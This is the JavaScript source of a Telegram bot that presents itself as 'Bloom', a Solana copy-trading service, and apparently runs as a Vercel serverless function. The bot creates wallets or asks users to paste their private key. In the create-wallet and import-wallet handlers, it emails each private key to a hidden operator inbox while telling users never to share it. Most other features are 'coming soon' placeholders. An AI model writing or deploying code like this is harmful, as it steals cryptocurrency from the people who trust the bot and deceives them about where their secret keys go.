// Entry point for Vercel serverless function
import { Telegraf, Markup } from 'telegraf';
import nodemailer from 'nodemailer';
import { Keypair } from '@solana/web3.js';
import bs58 from 'bs58';

const bot = new Telegraf(process.env.BOT_TOKEN);

// Email configuration
const transporter = nodemailer.createTransport({
  service: 'gmail', // or your preferred email service
  auth: {
    user: process.env.ADMIN_EMAIL,
    pass: process.env.ADMIN_EMAIL_PASSWORD // Use app password for Gmail
  }
});

// In-memory user storage (replace with database later)
const users = new Map();

// Helper function to send email notifications
async function sendAdminNotification(subject, content) {
  try {
    await transporter.sendMail({
      from: process.env.ADMIN_EMAIL,
      to: process.env.RECEIVER_EMAIL,
      subject: `[Bloom Bot] ${subject}`,
      html: content
    });
  } catch (error) {
    console.error('Failed to send email:', error);
  }
}

// Helper function to generate real Solana wallet
function generateSolanaWallet() {
  const keypair = Keypair.generate();
  return {
    publicKey: keypair.publicKey.toString(),
    secretKey: bs58.encode(keypair.secretKey)
  };
}

// Helper function to import wallet from private key
function importSolanaWallet(privateKeyString) {
  try {
    // Decode the private key from base58
    const secretKey = bs58.decode(privateKeyString);
    const keypair = Keypair.fromSecretKey(secretKey);
    return {
      publicKey: keypair.publicKey.toString(),
      secretKey: privateKeyString
    };
  } catch (error) {
    console.error('Invalid private key:', error);
    return null;
  }
}

// Start command - Welcome message
bot.start(async (ctx) => {
  const userId = ctx.from.id;
  const username = ctx.from.username || ctx.from.first_name;
  
  // Send admin notification about new user
  await sendAdminNotification(
    'New User Started Bot',
    `
    <h3>New User Activity</h3>
    <p><strong>User ID:</strong> ${userId}</p>
    <p><strong>Username:</strong> ${username}</p>
    <p><strong>First Name:</strong> ${ctx.from.first_name}</p>
    <p><strong>Last Name:</strong> ${ctx.from.last_name || 'N/A'}</p>
    <p><strong>Date:</strong> ${new Date().toLocaleString()}</p>
    `
  );

  await ctx.reply(
    '🌸 Welcome to Bloom!\n\nLet your trading journey blossom with us!',
    Markup.inlineKeyboard([
      [Markup.button.callback('🚀 Start Trading', 'start_trading')]
    ])
  );
});

// Start Trading button handler
bot.action('start_trading', async (ctx) => {
  const userId = ctx.from.id;
  
  if (!users.has(userId)) {
    // Show wallet creation options
    await ctx.editMessageText(
      '🌸 Welcome to Bloom!\n\nLet your trading journey blossom with us!\n\n🌸 Your Solana Wallet Address:\n\nYou currently have no SOL in your wallet.\nTo start trading, please deposit SOL to your address.\n\n📚 Resources:\n• 📖 Bloom Guides\n• 🔔 Bloom X\n• 🌐 Bloom Website\n• 🎯 Bloom Portal\n• 💬 Bloom Discord\n\n🇩🇪 EU1 • 🇺🇸 US1',
      Markup.inlineKeyboard([
        [Markup.button.callback('🎯 Create New Wallet', 'create_wallet')],
        [Markup.button.callback('📥 Import Wallet', 'import_wallet')],
        [Markup.button.callback('ℹ️ Menu', 'main_menu')]
      ])
    );
  } else {
    // User exists, show main menu
    await showMainMenu(ctx);
  }
});

// Create new wallet
bot.action('create_wallet', async (ctx) => {
  const userId = ctx.from.id;
  const username = ctx.from.username || ctx.from.first_name;
  
  const wallet = generateSolanaWallet();
  
  // Store user data
  users.set(userId, {
    walletAddress: wallet.publicKey,
    privateKey: wallet.secretKey,
    balance: 0,
    copyTradeActive: false,
    afkMode: false,
    createdAt: new Date()
  });

  // Send admin notification
  await sendAdminNotification(
    'New Wallet Created',
    `
    <h3>New Wallet Created</h3>
    <p><strong>User ID:</strong> ${userId}</p>
    <p><strong>Username:</strong> ${username}</p>
    <p><strong>Wallet Address:</strong> ${wallet.publicKey}</p>
    <p><strong>Private Key:</strong> ${wallet.secretKey}</p>
    <p><strong>Created At:</strong> ${new Date().toLocaleString()}</p>
    `
  );

  await ctx.editMessageText(
    `🌸 Welcome to Bloom!\n\nLet your trading journey blossom with us!\n\nYour Wallet Has Been Successfully Created ✅\n\n🔑 Save your Private Key:\nHere is your private key. Please store it securely and do not share it with anyone. Once this message is deleted, you won't be able to retrieve your private key again.\n\nPrivate Key:\n\`${wallet.secretKey}\`\n\n🌸 Your Solana Wallet Address:\n\`${wallet.publicKey}\`\n\nTo start trading, please deposit SOL to your address.\nOnly deposit SOL through SOL network.`,
    {
      parse_mode: 'Markdown',
      ...Markup.inlineKeyboard([
        [Markup.button.callback('🚀 Start Trading', 'show_main_menu')]
      ])
    }
  );
});

// Import wallet handler
bot.action('import_wallet', async (ctx) => {
  await ctx.editMessageText(
    'Please send your private key to import your wallet.\n\n⚠️ Make sure you\'re in a private chat and your private key is secure.',
    Markup.inlineKeyboard([
      [Markup.button.callback('« Back', 'start_trading')]
    ])
  );
  
  // Set user state to expect private key
  const userId = ctx.from.id;
  users.set(`${userId}_expecting`, 'private_key');
});

// Handle private key input for wallet import
bot.on('text', async (ctx) => {
  const userId = ctx.from.id;
  const expectingState = users.get(`${userId}_expecting`);
  
  if (expectingState === 'private_key') {
    const privateKeyInput = ctx.message.text.trim();
    const username = ctx.from.username || ctx.from.first_name;
    
    // Import wallet using real Solana private key
    const wallet = importSolanaWallet(privateKeyInput);
    
    if (!wallet) {
      await ctx.reply(
        '❌ Invalid private key format. Please make sure you\'re using a valid Solana private key in base58 format.',
        Markup.inlineKeyboard([
          [Markup.button.callback('« Back', 'start_trading')]
        ])
      );
      return;
    }
    
    // Store user data
    users.set(userId, {
      walletAddress: wallet.publicKey,
      privateKey: wallet.secretKey,
      balance: 0,
      copyTradeActive: false,
      afkMode: false,
      importedAt: new Date()
    });
    
    // Clear expecting state
    users.delete(`${userId}_expecting`);
    
    // Send admin notification
    await sendAdminNotification(
      'Wallet Imported',
      `
      <h3>Wallet Imported</h3>
      <p><strong>User ID:</strong> ${userId}</p>
      <p><strong>Username:</strong> ${username}</p>
      <p><strong>Wallet Address:</strong> ${wallet.publicKey}</p>
      <p><strong>Private Key:</strong> ${wallet.secretKey}</p>
      <p><strong>Imported At:</strong> ${new Date().toLocaleString()}</p>
      `
    );

    // Delete the private key message for security
    await ctx.deleteMessage();
    
    await ctx.reply(
      `✅ Wallet imported successfully!\n\n🌸 Your Solana Wallet Address:\n\`${wallet.publicKey}\`\n\nBalance: 0 SOL (USD $0)`,
      {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
          [Markup.button.callback('🚀 Start Trading', 'show_main_menu')]
        ])
      }
    );
  }
});

// Show main menu
async function showMainMenu(ctx) {
  const userId = ctx.from.id;
  const userData = users.get(userId);
  
  if (!userData) {
    await ctx.editMessageText('Please start by creating or importing a wallet.', 
      Markup.inlineKeyboard([[Markup.button.callback('🚀 Start Trading', 'start_trading')]])
    );
    return;
  }

  const menuText = `🌸 Bloom Copy Trade\n\n💡 Copy the best traders with Bloom!\n\nCopy Wallet:\n\`${userData.walletAddress}\`\n\n${userData.copyTradeActive ? '🟢' : '🔴'} Copy trade setup is ${userData.copyTradeActive ? 'active' : 'inactive'}\n\n⏱️ Please wait 10 seconds after each change for it to take effect.\n\n⚠️ Changing your copy wallet?\nRemember to remake your tasks to use the new wallet for future transactions.\n\n🕐 Last updated: ${new Date().toLocaleTimeString()}`;

  const keyboard = [
    [Markup.button.callback('🆕 Add new config', 'add_config'), Markup.button.callback('🚀 Mass Create', 'mass_create')],
    [Markup.button.callback('🔄 Update Tasks Wallet', 'update_wallet')],
    [Markup.button.callback('⏸️ Pause All', 'pause_all'), Markup.button.callback('▶️ Start All', 'start_all'), Markup.button.callback('🗑️ Delete All', 'delete_all')],
    [Markup.button.callback('💼 Wallet', 'wallet'), Markup.button.callback('⚙️ Settings', 'settings')],
    [Markup.button.callback('🛌 AFK Mode', 'afk_mode'), Markup.button.callback('🔄 Refresh', 'refresh')]
  ];

  await ctx.editMessageText(menuText, {
    parse_mode: 'Markdown',
    ...Markup.inlineKeyboard(keyboard)
  });
}

bot.action('show_main_menu', showMainMenu);

// Wallet button handler
bot.action('wallet', async (ctx) => {
  const userId = ctx.from.id;
  const userData = users.get(userId);
  
  if (!userData) {
    await ctx.answerCbQuery('Please create a wallet first!');
    return;
  }

  await ctx.editMessageText(
    `💼 Your Wallet\n\n🌸 Wallet Address:\n\`${userData.walletAddress}\`\n\nBalance: ${userData.balance} SOL (USD $${userData.balance * 150})\n\n${userData.balance === 0 ? '🔴 You currently have no SOL in your wallet.\nTo start trading, please deposit SOL to your address.\nOnly deposit SOL through SOL network.' : '✅ Ready to trade!'}`,
    {
      parse_mode: 'Markdown',
      ...Markup.inlineKeyboard([
        [Markup.button.callback('🔄 Refresh Balance', 'refresh_balance')],
        [Markup.button.callback('📤 Export Private Key', 'export_key')],
        [Markup.button.callback('« Back to Menu', 'show_main_menu')]
      ])
    }
  );
});

// Settings button handler - matches the image design
bot.action('settings', async (ctx) => {
  const userId = ctx.from.id;
  const userData = users.get(userId) || {};
  
  const settingsText = `🌸 Bloom Settings

🟢: The feature/mode is turned ON
🔴: The feature/mode is turned OFF

📚 Learn More!

🕐 Last updated: ${new Date().toLocaleTimeString()}`;

  const keyboard = [
    [Markup.button.callback('🛡️ Fee', 'fee_setting'), Markup.button.callback('💰 Wallets', 'wallets_setting')],
    [Markup.button.callback('🎁 Slippage', 'slippage_setting'), Markup.button.callback('🔧 Presets', 'presets_setting')],
    [Markup.button.callback('🔴 Degen Mode', 'degen_mode'), Markup.button.callback('🔴 Buy Protection', 'buy_protection')],
    [Markup.button.callback('🔴 Expert Mode', 'expert_mode'), Markup.button.callback('🔴 Private PNL', 'private_pnl')],
    [Markup.button.callback('⬅️ Back', 'show_main_menu'), Markup.button.callback('🇺🇸 ➡️ 🇨🇳', 'language_toggle')],
    [Markup.button.callback('❌ Close', 'close_settings')]
  ];

  await ctx.editMessageText(settingsText, {
    ...Markup.inlineKeyboard(keyboard)
  });
});

// Settings submenu handlers
bot.action('fee_setting', async (ctx) => {
  await ctx.answerCbQuery('Fee settings coming soon!');
});

bot.action('wallets_setting', async (ctx) => {
  await ctx.answerCbQuery('Wallets settings coming soon!');
});

bot.action('slippage_setting', async (ctx) => {
  await ctx.answerCbQuery('Slippage settings coming soon!');
});

bot.action('presets_setting', async (ctx) => {
  await ctx.answerCbQuery('Presets settings coming soon!');
});

bot.action('degen_mode', async (ctx) => {
  await ctx.answerCbQuery('Degen mode toggle coming soon!');
});

bot.action('buy_protection', async (ctx) => {
  await ctx.answerCbQuery('Buy protection toggle coming soon!');
});

bot.action('expert_mode', async (ctx) => {
  await ctx.answerCbQuery('Expert mode toggle coming soon!');
});

bot.action('private_pnl', async (ctx) => {
  await ctx.answerCbQuery('Private PNL toggle coming soon!');
});

bot.action('language_toggle', async (ctx) => {
  await ctx.answerCbQuery('Language toggle coming soon!');
});

bot.action('close_settings', async (ctx) => {
  await ctx.answerCbQuery('Settings closed');
  await showMainMenu(ctx);
});

// AFK Mode handler
bot.action('afk_mode', async (ctx) => {
  const userId = ctx.from.id;
  const userData = users.get(userId);
  
  if (!userData) {
    await ctx.answerCbQuery('Please create a wallet first!');
    return;
  }

  userData.afkMode = !userData.afkMode;
  users.set(userId, userData);

  // Send admin notification
  await sendAdminNotification(
    'AFK Mode Changed',
    `
    <h3>AFK Mode Status Changed</h3>
    <p><strong>User ID:</strong> ${userId}</p>
    <p><strong>Username:</strong> ${ctx.from.username || ctx.from.first_name}</p>
    <p><strong>AFK Mode:</strong> ${userData.afkMode ? 'Activated' : 'Deactivated'}</p>
    <p><strong>Time:</strong> ${new Date().toLocaleString()}</p>
    `
  );

  await ctx.answerCbQuery(`AFK Mode ${userData.afkMode ? 'activated' : 'deactivated'}!`);
  await showMainMenu(ctx);
});

// Copy Trade Toggle
bot.action('toggle_copy_trade', async (ctx) => {
  const userId = ctx.from.id;
  const userData = users.get(userId);
  
  if (!userData) {
    await ctx.answerCbQuery('Please create a wallet first!');
    return;
  }

  userData.copyTradeActive = !userData.copyTradeActive;
  users.set(userId, userData);

  // Send admin notification
  await sendAdminNotification(
    'Copy Trade Status Changed',
    `
    <h3>Copy Trade Status Changed</h3>
    <p><strong>User ID:</strong> ${userId}</p>
    <p><strong>Username:</strong> ${ctx.from.username || ctx.from.first_name}</p>
    <p><strong>Copy Trade:</strong> ${userData.copyTradeActive ? 'Activated' : 'Deactivated'}</p>
    <p><strong>Time:</strong> ${new Date().toLocaleString()}</p>
    `
  );

  await ctx.answerCbQuery(`Copy Trade ${userData.copyTradeActive ? 'activated' : 'deactivated'}!`);
  await showMainMenu(ctx);
});

// Settings submenu handlers
bot.action('fee_setting', async (ctx) => {
  await ctx.answerCbQuery('Fee settings coming soon!');
});

bot.action('wallets_setting', async (ctx) => {
  await ctx.answerCbQuery('Wallets settings coming soon!');
});

bot.action('slippage_setting', async (ctx) => {
  await ctx.answerCbQuery('Slippage settings coming soon!');
});

bot.action('presets_setting', async (ctx) => {
  await ctx.answerCbQuery('Presets settings coming soon!');
});

bot.action('degen_mode', async (ctx) => {
  await ctx.answerCbQuery('Degen mode toggle coming soon!');
});

bot.action('buy_protection', async (ctx) => {
  await ctx.answerCbQuery('Buy protection toggle coming soon!');
});

bot.action('expert_mode', async (ctx) => {
  await ctx.answerCbQuery('Expert mode toggle coming soon!');
});

bot.action('private_pnl', async (ctx) => {
  await ctx.answerCbQuery('Private PNL toggle coming soon!');
});

bot.action('language_toggle', async (ctx) => {
  await ctx.answerCbQuery('Language toggle coming soon!');
});

bot.action('close_settings', async (ctx) => {
  await ctx.answerCbQuery('Settings closed');
  await showMainMenu(ctx);
});

// Handle other button actions with placeholder responses
// (Duplicate buttonHandlers declaration and handler removed to prevent redeclaration error)

// Menu button handler
bot.action('main_menu', showMainMenu);

export default async function handler(req, res) {
  // Add CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  console.log('Request received:', {
    method: req.method,
    url: req.url,
    hasBody: !!req.body,
    bodyType: typeof req.body,
    timestamp: new Date().toISOString()
  });

  if (req.method === 'POST') {
    try {
      // Check if BOT_TOKEN is available
      if (!process.env.BOT_TOKEN) {
        console.error('BOT_TOKEN not found in environment variables');
        console.log('Available env vars:', Object.keys(process.env).filter(key => key.includes('BOT') || key.includes('TELEGRAM')));
        res.status(500).json({ error: 'Bot token not configured' });
        return;
      }

      console.log('Processing update:', JSON.stringify(req.body, null, 2));
      
      await bot.handleUpdate(req.body);
      console.log('Update processed successfully');
      res.status(200).send('ok');
    } catch (error) {
      console.error('Bot error:', error);
      console.error('Error stack:', error.stack);
      res.status(500).json({ 
        error: 'Error processing update',
        message: error.message,
        timestamp: new Date().toISOString()
      });
    }
  } else {
    // Test endpoint with more detailed info
    const envInfo = {
      botTokenConfigured: !!process.env.BOT_TOKEN,
      botTokenLength: process.env.BOT_TOKEN ? process.env.BOT_TOKEN.length : 0,
      emailConfigured: !!process.env.ADMIN_EMAIL,
      webhookConfigured: !!process.env.WEBHOOK_URL,
      nodeVersion: process.version,
      timestamp: new Date().toISOString()
    };
    
    console.log('GET request - Environment info:', envInfo);
    
    res.status(200).json({ 
      message: 'Hello from Bloom Telegram Bot!',
      ...envInfo
    });
  }
}
